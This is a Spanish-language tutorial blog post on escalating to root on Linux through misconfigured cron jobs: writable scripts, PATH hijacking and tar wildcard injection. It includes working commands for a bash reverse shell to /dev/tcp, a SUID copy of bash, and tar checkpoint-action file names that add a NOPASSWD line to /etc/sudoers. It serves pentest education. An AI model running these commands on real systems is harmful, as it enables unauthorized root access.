---
id: "escalada-de-privilegios-a-traves-de-cronjobs-linux"
title: "Escalada de Privilegios a través de Cron Jobs en Linux"
author: "andres-gonzalez"
publishedDate: 2022-10-26
updatedDate: 2022-10-26
image: "https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-0.webp"
description: "Aprende a identificar y explotar configuraciones incorrectas en Cron Jobs de Linux para escalar privilegios mediante permisos débiles, PATH y wildcards."
categories:
  - "linux"
draft: false
featured: false
lang: "es"
---

Dentro del mundo de las escaladas de privilegios en Linux existen una serie de verificaciones que debemos hacer y los Cron Jobs no deben ser la excepción. En este post vamos a estar explicando como se pueden aprovechar los escenarios más típicos con los Cron Jobs para escalar privilegios.

- [¿Qué es Cron?](#qué-es-cron)
- [Fichero Crontab](#fichero-crontab)
- [Comandos Crontab](#comandos-crontab)
- [Operadores Crontab](#operadores-crontab)
- [Restricciones de Crontab](#restricciones-de-crontab)
- [Cron Jobs](#cron-jobs)
- [Cron Jobs - File Permissions / File Overwrite](#cron-jobs---file-permissions--file-overwrite)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [Enumeración de tareas ocultas](#enumeración-de-tareas-ocultas)
- [Referencias](#referencias)

En los sistemas operativos Linux, al igual que otros sistemas, se puede automatizar el lanzamiento de programas o scripts en ciertos periodos de tiempo. Si esto se configura incorrectamente (Misconfigurations) puede llegar a permitir que los atacantes escalen privilegios.

Siempre es importante entender el proceso de lo que estamos haciendo, así que vamos a ver un poco de teoría:

## ¿Qué es Cron?

Cron es un clock daemon (demonio de reloj) que se ejecuta constantemente en segundo plano, permite a los usuarios automatizar tareas. Esta utilidad Cron examina una lista de “cosas por hacer” en busca de alguna tarea programada pendiente por ejecutar, de ser así, la ejecuta, si no, espera un periodo de tiempo y vuelve a verificar la lista. Esta lista de cosas por hacer se llama _cron table_ o Crontab.

Cron se maneja con diferentes ficheros, en el directorio /etc/ se encuentran:

- cron.hourly
- cron.daily
- cron.weekly
- cron.monthly

Si se coloca un script en uno de estos directorios, se ejecutará cada hora, día, semana o mes, según el directorio donde se haya agregado. Estos directorios son administrados por el fichero crontab.

![Listado de directorios cron en /etc mostrando cron.hourly, cron.daily, cron.weekly y cron.monthly](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-1.avif)

Ahora bien, hablemos sobre el fichero que contiene la lista de cosas por hacer → crontab

## Fichero crontab

El fichero crontab es el que contiene una lista de comandos destinados a ejecutarse en momentos específicos. Este tiene 5 campos para indicar las unidades de tiempo para ejecutar comandos ó tareas y su estructura es:

- _Minute / Hour / Day Of The Month / Month / Day Of The Week_

![Diagrama de la estructura de crontab mostrando los 5 campos de tiempo](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-2.avif)

## Comandos Crontab

Una vista rápida a aquellos parámetros que maneja crontab:

![Tabla con comandos crontab: -e para editar, -l para listar, -r para remover](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-3.avif)

- **crontab -e**: Edite el archivo crontab o cree uno si aún no existe.
- **crontab -l**: Muestra el contenido del archivo crontab.
- **crontab -r**: Elimina el crontab actual.
- **crontab -i**: Elimine su archivo crontab actual con un aviso antes de eliminarlo.
- **crontab -u <username>**: Se especifica el nombre del usuario cuyo crontab se va a utilizar (Esta opción requiere privilegios de root)

## Operadores Crontab

- **,**: especifica una lista de valores, por ejemplo: "1,3,4,7,8"
- **-**: especifica un rango de valores, por ejemplo: "1-6", que es equivalente a "1,2,3,4,5,6"
- **\***: especifica todos los valores posibles para un campo. Por ejemplo, un asterisco en el campo de hora equivaldría a 'cada hora'.
- **/**: se puede utilizar para omitir un número determinado de valores.

Ejemplos del uso de los operadores, para ejecutar tareas en intervalos de tiempo:

Recordatorio de la sintaxis:
- _Minute / Hour / Day Of The Month / Month / Day Of The Week_

---

- Ejecutar un comando a las 15:00 todos los días de lunes a viernes:

```bash
0 15 * * 1-5 command
```

- Ejecutar un script el primer lunes de cada mes, a las 7 am:

```bash
0 7 1-7 * 1 /path/to/script.sh
```

- Cada dos horas desde las 11 p.m. a las 7 a.m., y a las 8 a.m.:

```bash
0 23-7/2,8 * * * date
```

- A las 11:00 am el día 4 y todos los lun, mar, mié:

```bash
0 11 4 * lun-mié date
```

## Restricciones de Crontab

Existen ficheros con la capacidad de administrar qué usuarios pueden usar crontab, estos ficheros son:

- `/etc/cron.allow`
- `/etc/cron.deny`

Estos ficheros no existen por defecto pero pueden estar creados con la intención de tener un control. En el caso de que existan estas son las siguientes condiciones para los usuarios:

- Si el username está en el fichero `cron.allow` → Puede ejecutar crontab
- Si el fichero `cron.allow` no existe → Puede ejecutar crontab si su username no está en el fichero `cron.deny`
- Si `cron.deny` existe y está vacío → todos los usuarios pueden usar crontab
- Si ninguno de los archivos existe → dependiendo de los parámetros de configuración, solo root podrá utilizar este comando, o todos los usuarios podrán utilizarlo.

En los sistemas Debian estándar, todos los usuarios pueden utilizar este comando.

## Cron Jobs

En Linux a aquellas tareas programadas dentro del fichero crontab se les conoce como Cron Jobs. Los Cron Jobs se estructuran de la siguiente forma:

![Diagrama de la estructura de un cronjob mostrando tiempo, usuario y comando](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-4.avif)

Dentro del siguiente ejemplo podemos ver que el fichero crontab almacena dentro las tareas automatizadas, es decir los Cron Jobs:

![Ejemplo de fichero crontab con múltiples Cron Jobs configurados](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-5.avif)

Existen tres formas principales de explotar Cron Jobs:

- Permisos de archivo débiles (File Permissions / File Overwrite)
- Falta de la ruta absoluta en binarios y comandos (PATH Environment Variable)
- El uso de (\*) que se emplean al ejecutar comandos, (Wildcards)

Ahora vamos a ir viendo cada una de estas formas.

## Cron Jobs - File Permissions / File Overwrite

Veamos el fichero `/etc/crontab`:

```bash
cat /etc/crontab
```

![Contenido de /etc/crontab mostrando Cron Jobs de overwrite.sh y compress.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-6.avif)

Observamos que existen 2 tareas programadas para ejecutarse cada minuto con los privilegios de root:

- `overwrite.sh`
- `/usr/local/bin/compress.sh`

Ahora buscamos donde se aloja el fichero `overwrite.sh`:

```bash
locate overwrite.sh
```

![Resultado de locate mostrando ubicación de overwrite.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-7.avif)

Se aloja en `/usr/local/bin/overwrite.sh` pasamos a verificar los permisos:

```bash
ls -lah /usr/local/bin/overwrite.sh
```

![Permisos de overwrite.sh mostrando que otros usuarios tienen permisos de escritura](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-8.avif)

Como vemos "otros" tienen permisos de escritura, pasamos a aprovecharnos de esto para modificar el script `overwrite.sh`.

Podemos bien añadir líneas al script ó reemplazarlo todo, para el ejemplo lo vamos a reemplazar con una reverse shell en bash:

```bash
nano /usr/local/bin/overwrite.sh
```

![Modificación de overwrite.sh con una reverse shell en bash](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-9.avif)

Una vez modificado el fichero, nos colocamos a la escucha en nuestra máquina en el mismo puerto señalado en el script.

Desde nuestra máquina:

```bash
nc -lvp 4444
```

![Netcat esperando conexión y recibiendo shell con privilegios de root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-10.avif)

Obtenemos shell con los privilegios de root esto debido a que existe una tarea programada o un cronjob que ejecuta el script que hemos modificado como root. Además, lo verdaderamente importante es que este script puede ser modificado por “otros”.

## Cron Jobs - PATH Environment Variable

Nuevamente, verificamos el fichero `/etc/crontab`:

```bash
cat /etc/crontab
```

![Crontab mostrando variable PATH y cronjob sin ruta absoluta](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-11.avif)

2 Puntos a destacar en esta vista del fichero crontab serían:

- Que dentro de los Cron Jobs está el script `overwrite.sh` y este no se llama desde una ruta absoluta, por lo tanto, al ejecutarse este cronjob, se iniciará una búsqueda en todo el PATH que podemos ver en el propio crontab, hasta encontrar el script `overwrite.sh` para ejecutarse.
- La variable PATH comienza por el directorio `/home/user`

Del ejemplo anterior sabemos que `overwrite.sh` está ubicado en `/usr/local/bin/` y la búsqueda se haría de la siguiente manera:

![Diagrama mostrando orden de búsqueda en PATH para overwrite.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-12.avif)

Aprovechando este escenario creamos un script con el mismo nombre `overwrite.sh` en el directorio `/home/user` así al momento de ejecutarse la tarea programada y se inicie la búsqueda en el PATH se identificará y ejecutará el que hemos creado puesto que está posicionado antes que el otro en el PATH.

Y ahora la búsqueda sería así:

![Diagrama mostrando cómo el script malicioso en /home/user se ejecuta primero](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-13.avif)

Una vez ubicados en `/home/user` creamos el script `overwrite.sh`. Ya en este punto las posibilidades están limitadas a tu imaginación, es decir, que puede haber más de una acción que te lleve a ser root. Para este ejemplo, dentro del script copiamos y pegamos el binario `/bin/bash` en `/tmp/bash` y otorgamos permisos SUID, ya que con ello podemos pasar a ser root fácilmente.

Finalmente, le otorgamos privilegios de ejecución y esperamos a que se ejecute el cronjob:

```bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

![Creación del script overwrite.sh malicioso en /home/user](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-14.avif)

![Asignación de permisos de ejecución al script malicioso](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-15.avif)

Después de unos segundos, cuando se ejecute la tarea:

![Verificación de que bash se copió a /tmp con permisos SUID](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-16.avif)

Observamos que ya se ha ejecutado el cronjob porque el binario de `/bin/bash` se ha copiado a la carpeta `/tmp/` y se le ha asignado permisos SUID. Pasamos a ejecutar el binario bash ya con permisos SUID tal como lo indican en [GTFOBins para bash con SUID](https://gtfobins.github.io/gtfobins/bash/#suid):

```bash
./bash -p
```

![Escalada de privilegios exitosa obteniendo shell de root mediante bash con SUID](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-17.avif)

Nuevamente, somos root, todo gracias a que en el cronjob, en el caso de overwrite.sh no se llama desde una ruta absoluta y, además, tenemos capacidad de escritura en una de las rutas previas a donde se encuentra el binario legítimo.

## Cron Jobs - Wildcards

Básicamente, dentro de este escenario el problema que existe es que cuando se ejecuta un cronjob con un wildcard (`*`) la presencia de este interpreta el nombre de todos los ficheros donde se está ejecutando el wildcard (`*`) como argumentos. Por ende podemos inyectar argumentos creando ficheros con nombres que correspondan a argumentos válidos para ese programa. Para el ejemplo estaríamos hablando de argumentos válidos para `tar`.

Verifiquemos una vez más el fichero `/etc/crontab`:

```bash
cat /etc/crontab
```

![Crontab mostrando cronjob con wildcard en comando tar](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-18.avif)

En el crontab podemos encontrar una tarea que ejecuta un script el cual contiene el comando `tar` con un wildcard (`*`) en el directorio `/home/user` como argumento.

- **Tar → Execute arbitrary commands:**

![Documentación de GTFOBins mostrando parámetros de tar para ejecutar comandos](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-19.avif)

En este caso, `tar` posee parámetros por el cual se puede tener la capacidad de ejecutar comandos. Concretamente, para `tar`, podemos hacer uso de los parámetros de la imagen, donde en "ACTION" usaremos "exec" para ejecutar un comando externo dado.

```bash
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh
echo "" > "--checkpoint-action=exec=sh run.sh"
echo "" > --checkpoint=1
```

![Creación de archivos con nombres de parámetros de tar y script run.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-20.avif)

Para este ejemplo, se crean dos archivos nombrados como los parámetros de `tar`, los cuales, ejecutarán el archivo `run.sh`, el cual, agregará a nuestro usuario la capacidad de poder ejecutar como cualquier usuario cualquier comando, gracias al `sudoers` (esto último es simplemente una posible forma de escalar privilegios, otras maneras ya vistas en este post, serían mediante ejecución directa de una reverse shell, o asignar SUID a bash).

Una vez se ejecuta la tarea cron, al realizar `sudo -l` verificamos que podemos ejecutar comandos con sudo. En otras palabras estamos dentro del grupo sudoers:

![Verificación con sudo -l mostrando que user tiene permisos NOPASSWD ALL](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-21.avif)

Nota: se repite por cada vez que la tarea ha sido ejecutada y, por tanto, agrega la sentencia de nuevo al archivo

![Contenido de /etc/sudoers mostrando líneas duplicadas agregadas](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-22.avif)

Y finalmente somos root de nuevo todo debido a que está presente un wildcard (`*`) en una tarea programada que se ejecuta con root y que utiliza `tar` y el mismo dispone de argumentos para ejecutar comandos.

Un ejemplo visual de esta situación sería:

![Diagrama visual explicando cómo funciona el ataque con wildcards en tar](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-23.avif)

Otros binarios distintos de Tar que también son susceptibles al uso de wildcards son:

- chown / chmod
- Rsync
- 7z
- zip

## Enumeración de tareas ocultas

Es posible que se pueda dar el escenario donde existan tareas o Cron Jobs que no sepamos capaces de enumerar con los privilegios que tenemos y, por tanto, para enumerarlas tenemos que hacer uso de herramientas como [pspy](https://github.com/DominicBreuker/pspy).

En este ejemplo vemos como siendo el usuario `www-data` no identificamos Cron Jobs custom:

![Terminal mostrando que usuario www-data no encuentra Cron Jobs custom](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-24.avif)

Ahora, utilizando la herramienta `pspy` que se encarga de monitorizar los procesos y los mismos son visibles para todos:

![Herramienta pspy detectando cronjob oculto ejecutado por root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-25.avif)

Se identifica un cronjob ejecutado por el usuario root (UID=0), donde está ejecutando el siguiente script: `/var/www/html/tmp/clean.sh`

![Salida de pspy mostrando ejecución del script clean.sh por root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-26.avif)

Verificamos los permisos sobre el script `clean.sh` y somos propietarios del script:

![Permisos del script clean.sh mostrando que www-data es propietario](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-27.avif)

En este caso lo modificamos y agregamos una reverse shell y nos colocamos a la escucha:

```bash
echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> clean.sh
nc -nlvp port
```

![Shell de root obtenida a través de la modificación del script clean.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-28.avif)

Como vemos tenemos los privilegios de root.

Aquí es donde surgen las preguntas:

- **¿Si existe un cronjob y verifiqué el fichero /etc/crontab y no lo vi, entonces dónde está?**

Básicamente, esto se debe a que en la ruta `/var/spool/cron/crontabs` se almacenan ficheros que se crean según el nombre de la cuenta del usuario, esto quiere decir que pueden existir tareas programadas o crontabs que se ejecutan como root en un fichero llamado `root` y solo es visible por root. Entonces digamos que cron dentro de su "lista de cosas por hacer" verifica también `/var/spool/cron/crontabs` en la búsqueda de ficheros crontab.

Siendo una vez root, verificamos el fichero y los permisos y como podemos ver se encuentra alojada la tarea programada o el cronjob identificado por `pspy`:

![Fichero /var/spool/cron/crontabs/root mostrando el cronjob oculto](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-29.avif)

Regresamos al usuario `www-data` para confirmar que efectivamente con estos privilegios no somos capaces de ver este fichero:

![Intento fallido de www-data de leer el fichero crontabs de root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-30.avif)

Por último, una lista resumen de directorios u archivos a revisar de cara a detectar posibles tareas cron (en caso de que nuestro usuario tenga permisos de lectura) serían:
- `/var/scripts/`
- `/var/log/cron.log`
- `/etc/crontab`
- `/var/spool/cron/`
- `/var/spool/cron/crontabs/`
- `/etc/cron.hourly`
- `/etc/cron.daily`
- `/etc/cron.weekly`
- `/etc/cron.monthly`

## Referencias

- [Linux - cron and crontab](https://compbio.cornell.edu/about/resources/linux-cron-and-crontab/)
- [Linux Privilege Escalation by Exploiting Cron Jobs](https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/)
- [Linux Privilege Escalation – Scheduled Tasks](https://steflan-security.com/linux-privilege-escalation-scheduled-tasks/)
- [Tar - Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [Exploiting the Cron Jobs Misconfigurations (Privilege Escalation)](https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/)
- [Scheduling Cron Jobs with Crontab](https://linuxize.com/post/scheduling-cron-jobs-with-crontab/)
